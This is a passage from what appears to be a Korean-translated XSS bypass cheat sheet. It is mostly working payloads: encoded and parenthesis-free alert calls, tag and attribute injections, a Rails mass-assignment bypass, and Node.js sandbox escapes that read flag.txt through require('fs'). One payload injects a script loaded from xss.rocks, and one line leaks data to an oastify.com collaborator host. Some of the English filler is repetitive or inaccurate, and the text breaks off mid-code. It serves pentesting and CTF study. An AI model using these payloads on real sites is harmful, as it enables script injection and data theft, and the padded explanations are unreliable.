JS에서는 **단일 따옴표**와 **이중 따옴표** 외에도 **역따옴표** **` `` `**를 사용하여 **문자열**을 구성할 수 있습니다. 이를 템플릿 리터럴이라고 하는데, `${ ... }` 구문을 사용하여 **JS 표현식을 포함**할 수 있습니다.\
따라서, 입력이 **역따옴표**를 사용하는 JS 문자열 내에서 **반영**되고 있다면, `${ ... }` 구문을 악용하여 **임의의 JS 코드**를 실행할 수 있습니다:

다음과 같이 악용할 수 있습니다:
```javascript
`${alert(1)}`
`${`${`${`${alert(1)}`}`}`}`
```

```````````````javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop(){return loop}
loop``````````````
```````````````
### 인코딩된 코드 실행

Sometimes, web applications may apply encoding techniques to user input in order to prevent malicious code execution. However, it is still possible to bypass these encoding mechanisms and execute code.

#### HTML Entity Encoding

One common encoding technique is HTML entity encoding, where special characters are replaced with their corresponding HTML entities. For example, the less-than sign `<` is encoded as `&lt;` and the greater-than sign `>` is encoded as `&gt;`.

To bypass HTML entity encoding, you can use different techniques such as double encoding, mixed encoding, or using alternative encodings. These techniques involve encoding the special characters in a way that the application does not recognize as HTML entities.

#### JavaScript Encoding

Another encoding technique is JavaScript encoding, where special characters are encoded using JavaScript escape sequences. For example, the double quote `"` is encoded as `\"` and the single quote `'` is encoded as `\'`.

To bypass JavaScript encoding, you can use techniques such as double encoding, mixed encoding, or using alternative encodings. These techniques involve encoding the special characters in a way that the application does not recognize as JavaScript escape sequences.

#### URL Encoding

URL encoding is another common encoding technique used to encode special characters in URLs. For example, the space character is encoded as `%20` and the slash character `/` is encoded as `%2F`.

To bypass URL encoding, you can use techniques such as double encoding, mixed encoding, or using alternative encodings. These techniques involve encoding the special characters in a way that the application does not recognize as URL-encoded characters.

#### Conclusion

Encoded code execution vulnerabilities can be exploited by bypassing the encoding mechanisms implemented by web applications. By understanding different encoding techniques and using appropriate bypass techniques, you can successfully execute code and exploit these vulnerabilities.
```markup
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</iframe>">
```
### Unicode JS 실행 인코딩

This technique involves encoding JavaScript payloads using Unicode characters to bypass input filters and execute arbitrary code on a vulnerable web application.

이 기법은 취약한 웹 애플리케이션에서 입력 필터를 우회하고 임의의 코드를 실행하기 위해 JavaScript 페이로드를 유니코드 문자로 인코딩하는 것을 포함합니다.

#### Basic Payload

The basic payload for Unicode encoding JavaScript is as follows:

유니코드로 JavaScript를 인코딩하는 기본 페이로드는 다음과 같습니다:

```html
<script>
    eval('\u0061\u006c\u0065\u0072\u0074(1)');
</script>
```

#### Explanation

In this payload, the `eval` function is used to execute the encoded JavaScript code. The Unicode characters `\u0061`, `\u006c`, `\u0065`, `\u0072`, and `\u0074` represent the characters `a`, `l`, `e`, `r`, and `t` respectively. The number `1` is the argument passed to the `alert` function.

이 페이로드에서는 `eval` 함수를 사용하여 인코딩된 JavaScript 코드를 실행합니다. 유니코드 문자 `\u0061`, `\u006c`, `\u0065`, `\u0072`, `\u0074`는 각각 문자 `a`, `l`, `e`, `r`, `t`를 나타냅니다. 숫자 `1`은 `alert` 함수에 전달되는 인수입니다.

#### Bypassing Filters

Some web applications may have filters in place to block certain characters or keywords. Unicode encoding can help bypass these filters by representing the blocked characters using their Unicode equivalents.

일부 웹 애플리케이션은 특정 문자나 키워드를 차단하기 위해 필터를 설정할 수 있습니다. 유니코드 인코딩을 사용하면 차단된 문자를 해당하는 유니코드로 표현하여 이러한 필터를 우회할 수 있습니다.

For example, if the application filters the keyword `alert`, it can be bypassed using the Unicode equivalent `\u0061\u006c\u0065\u0072\u0074`.

예를 들어, 애플리케이션이 키워드 `alert`를 필터링하는 경우, 유니코드 등가인 `\u0061\u006c\u0065\u0072\u0074`를 사용하여 필터를 우회할 수 있습니다.

#### Conclusion

Unicode encoding is a useful technique for bypassing input filters and executing JavaScript code on vulnerable web applications. However, it is important to note that this technique may not work in all scenarios, as some applications may have additional security measures in place to detect and block such payloads.

유니코드 인코딩은 입력 필터를 우회하고 취약한 웹 애플리케이션에서 JavaScript 코드를 실행하는 데 유용한 기술입니다. 그러나 이 기술이 모든 시나리오에서 작동하지 않을 수 있으며, 일부 애플리케이션은 이러한 페이로드를 감지하고 차단하기 위해 추가적인 보안 조치를 취할 수 있음을 유의해야 합니다.
```javascript
\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)
```
### JavaScript 블랙리스트 우회 기법

**문자열**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**특수 이스케이프**

In some cases, the traditional HTML entities may not work to escape characters in XSS attacks. In such situations, special escapes can be used to bypass filters and successfully execute the attack.

다른 경우에는 전통적인 HTML 엔티티가 XSS 공격에서 문자를 이스케이프하는 데 동작하지 않을 수 있습니다. 이러한 상황에서는 특수 이스케이프를 사용하여 필터를 우회하고 공격을 성공적으로 실행할 수 있습니다.

Here are some examples of special escapes:

다음은 특수 이스케이프의 몇 가지 예시입니다:

- **CSS Escape**: This escape technique can be used when the payload is injected into a CSS context. It involves using the `\` character to escape special characters. For example, `\"` can be used to escape a double quote.

  - **CSS 이스케이프**: 이 이스케이프 기법은 페이로드가 CSS 컨텍스트에 주입될 때 사용할 수 있습니다. 특수 문자를 이스케이프하기 위해 `\` 문자를 사용하는 것을 포함합니다. 예를 들어, `\"`는 이중 인용부호를 이스케이프하는 데 사용될 수 있습니다.

- **JavaScript Escape**: This escape technique can be used when the payload is injected into a JavaScript context. It involves using the `\` character to escape special characters. For example, `\"` can be used to escape a double quote.

  - **JavaScript 이스케이프**: 이 이스케이프 기법은 페이로드가 JavaScript 컨텍스트에 주입될 때 사용할 수 있습니다. 특수 문자를 이스케이프하기 위해 `\` 문자를 사용하는 것을 포함합니다. 예를 들어, `\"`는 이중 인용부호를 이스케이프하는 데 사용될 수 있습니다.

- **URL Escape**: This escape technique can be used when the payload is injected into a URL context. It involves using URL encoding to represent special characters. For example, `%22` can be used to represent a double quote.

  - **URL 이스케이프**: 이 이스케이프 기법은 페이로드가 URL 컨텍스트에 주입될 때 사용할 수 있습니다. 특수 문자를 나타내기 위해 URL 인코딩을 사용하는 것을 포함합니다. 예를 들어, `%22`는 이중 인용부호를 나타내는 데 사용될 수 있습니다.

- **HTML Escape**: This escape technique can be used when the payload is injected into an HTML context. It involves using HTML entities to represent special characters. For example, `&quot;` can be used to represent a double quote.

  - **HTML 이스케이프**: 이 이스케이프 기법은 페이로드가 HTML 컨텍스트에 주입될 때 사용할 수 있습니다. 특수 문자를 나타내기 위해 HTML 엔티티를 사용하는 것을 포함합니다. 예를 들어, `&quot;`는 이중 인용부호를 나타내는 데 사용될 수 있습니다.
```javascript
'\b' //backspace
'\f' //form feed
'\n' //new line
'\r' //carriage return
'\t' //tab
'\b' //backspace
'\f' //form feed
'\n' //new line
'\r' //carriage return
'\t' //tab
// Any other char escaped is just itself
```
**JS 코드 내에서의 공백 대체**

In some cases, when trying to inject a JavaScript payload into a vulnerable input field, the spaces in the payload may be filtered or sanitized. However, there are several techniques to bypass these filters and successfully execute the payload.

일부 경우에는 취약한 입력 필드에 JavaScript 페이로드를 삽입하려고 할 때, 페이로드 내의 공백이 필터링되거나 제거될 수 있습니다. 그러나 이러한 필터를 우회하고 페이로드를 성공적으로 실행하기 위한 여러 기술이 있습니다.

One common technique is to use alternative characters or encodings to represent spaces. Here are some examples:

일반적인 기술 중 하나는 대체 문자 또는 인코딩을 사용하여 공백을 나타내는 것입니다. 다음은 몇 가지 예시입니다:

- **URL encoding**: Spaces can be represented as `%20` in URL encoding. For example, `<script>alert(%20'XSS')<%2fscript>`.

- **URL 인코딩**: URL 인코딩에서는 공백을 `%20`으로 나타낼 수 있습니다. 예를 들어, `<script>alert(%20'XSS')<%2fscript>`.

- **Hex encoding**: Spaces can be represented as `%20` in hex encoding. For example, `<script>alert(%20'XSS')<%2fscript>`.

- **16진수 인코딩**: 16진수 인코딩에서는 공백을 `%20`으로 나타낼 수 있습니다. 예를 들어, `<script>alert(%20'XSS')<%2fscript>`.

- **Unicode encoding**: Spaces can be represented as `\u0020` in Unicode encoding. For example, `<script>alert(\u0020'XSS')<\u002fscript>`.

- **유니코드 인코딩**: 유니코드 인코딩에서는 공백을 `\u0020`으로 나타낼 수 있습니다. 예를 들어, `<script>alert(\u0020'XSS')<\u002fscript>`.

By using these techniques, you can bypass filters that are specifically looking for spaces and successfully inject your payload into the vulnerable input field.

이러한 기술을 사용하여, 특정 공백을 찾는 필터를 우회하고 취약한 입력 필드에 페이로드를 성공적으로 삽입할 수 있습니다.
```javascript
<TAB>
/**/
```
**JavaScript comments (from** [**JavaScript Comments**](./#javascript-comments) **trick)**

자바스크립트 주석 (from [JavaScript Comments](./#javascript-comments) 트릭)
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScript new lines (from** [**JavaScript new line**](./#javascript-new-lines) **trick)**

**자바스크립트 새 줄 (자바스크립트 새 줄 트릭에서)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10); alert('//\nalert(1)') //0x0a
String.fromCharCode(13); alert('//\ralert(1)') //0x0d
String.fromCharCode(8232); alert('//\u2028alert(1)') //0xe2 0x80 0xa8
String.fromCharCode(8233); alert('//\u2029alert(1)') //0xe2 0x80 0xa9
```
**JavaScript 공백**

JavaScript에서 공백은 코드의 가독성을 높이고 구문을 분리하는 데 사용됩니다. 공백은 런타임 동안 무시되므로 코드의 동작에는 영향을 주지 않습니다. JavaScript에서 사용되는 세 가지 주요 공백 유형은 다음과 같습니다.

1. 스페이스(Space): 일반적인 공백 문자로, 코드의 가독성을 높이기 위해 사용됩니다.

2. 탭(Tab): 여러 개의 스페이스 문자로 구성되며, 코드를 들여쓰기하는 데 사용됩니다.

3. 줄 바꿈(Newline): 코드를 여러 줄로 나누는 데 사용됩니다. 줄 바꿈은 보통 세미콜론(;)으로 끝나는 문장의 끝에 추가됩니다.

이러한 공백 문자는 JavaScript 코드 내에서 자유롭게 사용할 수 있으며, 코드의 가독성을 개선하는 데 도움이 됩니다.
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**주석 내부의 자바스크립트**

주석 내부에 자바스크립트를 삽입하는 기법입니다.
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**괄호 없는 JavaScript**

JavaScript에서 함수를 호출할 때 괄호를 사용하지 않는 기법입니다. 이 기법은 XSS(Cross-Site Scripting) 공격에서 사용될 수 있습니다. XSS 공격은 악의적인 스크립트를 삽입하여 웹 페이지의 취약점을 이용하여 사용자의 정보를 탈취하거나 조작하는 공격입니다. 이 기법은 괄호를 사용하지 않고 JavaScript 코드를 실행하여 악의적인 스크립트를 실행할 수 있습니다.
````javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x```

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.
````
* [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
* [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**임의 함수(alert) 호출**
````javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
````
## **DOM 취약점**

공격자가 제어하는 `location.href`와 같은 **안전하지 않은 데이터를 사용하는 JS 코드**가 있습니다. 공격자는 이를 악의적인 JS 코드를 실행하기 위해 악용할 수 있습니다.\
**DOM 취약점에 대한 설명이 너무 길어져서** [**이 페이지로 이동했습니다**](dom-xss.md)**:**

{% content-ref url="dom-xss.md" %}
[dom-xss.md](dom-xss.md)
{% endcontent-ref %}

해당 페이지에서는 **DOM 취약점이 무엇인지, 어떻게 유발되는지, 그리고 어떻게 악용하는지에 대한 자세한 설명**을 찾을 수 있습니다.\
또한, 언급된 게시물의 끝에서 [**DOM Clobbering 공격에 대한 설명**](dom-xss.md#dom-clobbering)을 찾을 수 있습니다.

## 기타 우회 방법

### 정규화된 유니코드

서버(또는 클라이언트 측)에서 **반사된 값**이 **유니코드 정규화**되는지 확인하고 이 기능을 악용하여 보호 기능을 우회할 수 있습니다. [**여기에서 예제를 찾을 수 있습니다**](../unicode-injection/#xss-cross-site-scripting).

### PHP FILTER\_VALIDATE\_EMAIL 플래그 우회
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails 우회

**RoR 대량 할당**으로 인해 따옴표가 HTML에 삽입되고, 따옴표 제한이 우회되어 태그 내에 추가 필드 (onfocus)를 추가할 수 있습니다.\
예시 양식 ([이 보고서](https://hackerone.com/reports/709336)에서 가져옴)에서 페이로드를 보내면:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
다음과 같이 "Key","Value" 쌍이 에코됩니다:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
### 특수한 조합

In some cases, you may need to use special combinations of characters to bypass filters or achieve the desired XSS payload. Here are some examples:

#### HTML entities

HTML entities can be used to represent special characters in HTML. By using HTML entities, you can bypass filters that may be looking for specific characters. For example, the `<` character can be represented as `&lt;` and the `>` character can be represented as `&gt;`. Here are some commonly used HTML entities:

- `<` can be represented as `&lt;`
- `>` can be represented as `&gt;`
- `"` can be represented as `&quot;`
- `'` can be represented as `&#x27;` or `&apos;`
- `/` can be represented as `&#x2F;`

#### JavaScript escape sequences

JavaScript escape sequences can be used to represent special characters in JavaScript. By using JavaScript escape sequences, you can bypass filters that may be looking for specific characters. For example, the `"` character can be represented as `\"` and the `'` character can be represented as `\'`. Here are some commonly used JavaScript escape sequences:

- `"` can be represented as `\"`
- `'` can be represented as `\'`
- `<` can be represented as `\<`
- `>` can be represented as `\>`

#### URL encoding

URL encoding can be used to represent special characters in URLs. By using URL encoding, you can bypass filters that may be looking for specific characters. For example, the `<` character can be represented as `%3C` and the `>` character can be represented as `%3E`. Here are some commonly used URL encoding characters:

- `<` can be represented as `%3C`
- `>` can be represented as `%3E`
- `"` can be represented as `%22`
- `'` can be represented as `%27`
- `/` can be represented as `%2F`

Remember to experiment and test different combinations to find the one that works best for your specific scenario.
```markup
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### 302 응답에서 헤더 주입을 통한 XSS

만약 **302 리디렉션 응답에서 헤더를 주입**할 수 있다면, 브라우저가 **임의의 JavaScript를 실행**하도록 시도해볼 수 있습니다. 이는 현대의 브라우저가 HTTP 응답 상태 코드가 302인 경우 HTTP 응답 본문을 해석하지 않기 때문에 쉽지 않습니다. 따라서 단순한 크로스 사이트 스크립팅 페이로드는 쓸모가 없습니다.

[**이 보고서**](https://www.gremwell.com/firefox-xss-302)와 [**이 보고서**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/)에서는 Location 헤더 내에서 여러 프로토콜을 테스트하고 브라우저가 본문 내의 XSS 페이로드를 검사하고 실행할 수 있는지 확인하는 방법을 읽을 수 있습니다.\
과거에 알려진 프로토콜: `mailto://`, `//x:1/`, `ws://`, `wss://`, _빈 Location 헤더_, `resource://`.

### 문자, 숫자, 점(.)만 허용

만약 **콜백(callback)**으로 제한된 문자만을 사용하여 JavaScript가 **실행**될 것임을 나타낼 수 있다면, [**이 게시물의 이 섹션**](./#javascript-function)을 읽어 이 동작을 악용하는 방법을 찾을 수 있습니다.

### XSS에 대한 유효한 `<script>` 콘텐츠 유형

([**여기**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)에서 가져옴) `application/octet-stream`과 같은 **콘텐츠 유형**으로 스크립트를 로드하려고 시도하면 Chrome은 다음과 같은 오류를 발생시킵니다:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

Chrome에서 **로드된 스크립트**를 실행할 수 있는 유일한 **콘텐츠 유형**은 [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third\_party/blink/common/mime\_util/mime\_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third\_party/blink/common/mime\_util/mime\_util.cc)의 상수 **`kSupportedJavascriptTypes`**에 있는 것들입니다.
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### XSS에 사용되는 스크립트 유형

([**여기**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)에서 가져옴) 그래서, 어떤 유형의 스크립트를 로드하는 데 사용될 수 있을까요?
```html
<script type="???"></script>
```
다음은 번역된 내용입니다:

* **module** (기본값, 설명할 것이 없음)
* [**webbundle**](https://web.dev/web-bundles/): 웹 번들은 여러 데이터 (HTML, CSS, JS...)를 하나의 **`.wbn`** 파일로 패키징할 수 있는 기능입니다.
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
* [**importmap**](https://github.com/WICG/import-maps)**:** import 구문을 개선할 수 있게 해줍니다.
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment";
import { partition } from "lodash";
</script>
```
이 동작은 [**이 writeup**](https://github.com/zwade/yaca/tree/master/solution)에서 사용되었으며, 라이브러리를 eval로 다시 매핑하여 XSS를 유발하는 것을 악용합니다.

* [**speculationrules**](https://github.com/WICG/nav-speculation)**:** 이 기능은 주로 사전 렌더링에 의해 발생하는 일부 문제를 해결하기 위해 사용됩니다. 다음과 같이 작동합니다:
```html
<script type="speculationrules">
{
"prerender": [
{"source": "list",
"urls": ["/page/2"],
"score": 0.5},
{"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1}
]
}
</script>
```
### XSS를 위한 웹 콘텐츠 유형

([**여기**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)에서) 다음 콘텐츠 유형은 모든 브라우저에서 XSS를 실행할 수 있습니다:

* text/html
* application/xhtml+xml
* application/xml
* text/xml
* image/svg+xml
* text/plain (?? 목록에는 없지만 CTF에서 본 것 같습니다)
* application/rss+xml (off)
* application/atom+xml (off)

다른 브라우저에서는 다른 **`Content-Types`**를 사용하여 임의의 JS를 실행할 수 있습니다. 확인하세요: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml 콘텐츠 유형

페이지가 text/xml 콘텐츠 유형을 반환하는 경우 네임스페이스를 지정하고 임의의 JS를 실행할 수 있습니다:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### 특수 대체 패턴

**`"some {{template}} data".replace("{{template}}", <user_input>)`**와 같은 것이 사용될 때, 공격자는 [**특수 문자열 대체**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global\_Objects/String/replace#specifying\_a\_string\_as\_the\_replacement)을 사용하여 일부 보호 기능을 우회하려고 시도할 수 있습니다: ``"123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"}))``

예를 들어, [**이 writeup**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA)에서는 이를 사용하여 스크립트 내의 JSON 문자열을 **이스케이프**하고 임의의 코드를 실행했습니다.

### Chrome 캐시를 통한 XSS

{% content-ref url="chrome-cache-to-xss.md" %}
[chrome-cache-to-xss.md](chrome-cache-to-xss.md)
{% endcontent-ref %}

### XS Jails 탈출

사용할 수 있는 문자 집합이 제한된 경우, XSJail 문제에 대한 다른 유효한 해결책을 확인하세요.
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
만약 신뢰할 수 없는 코드를 실행하기 전에 **모든 것이 정의되지 않은** 상태라면 ([**이 writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/#miscx2fundefined55-solves)에서와 같이), 임의의 신뢰할 수 없는 코드의 실행을 악용하기 위해 "아무 것도 없는" 유용한 객체를 생성하는 것이 가능합니다:

* import() 사용하기
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then(m=>console.log(m.readFileSync("/flag.txt", "utf8")))
```
* 간접적으로 `require`에 접근하기

[이에 따르면](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) 모듈은 Node.js에서 다음과 같이 함수로 래핑됩니다:
```javascript
(function (exports, require, module, __filename, __dirname) {
// our actual module code
});
```
따라서, 만약 그 모듈에서 **다른 함수를 호출**할 수 있다면, 그 함수에서 **`require`**에 접근하기 위해 `arguments.callee.caller.arguments[1]`을 사용할 수 있습니다:

{% code overflow="wrap" %}
```javascript
(function(){return arguments.callee.caller.arguments[1]("fs").readFileSync("/flag.txt", "utf8")})()
```
{% endcode %}

이전 예제와 유사한 방식으로, **에러 핸들러를 사용하여** 모듈의 **래퍼(wrapper)**에 접근하고 **`require`** 함수를 얻을 수 있습니다:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = ''.constructor
Error = TypeError.prototype.__proto__.constructor
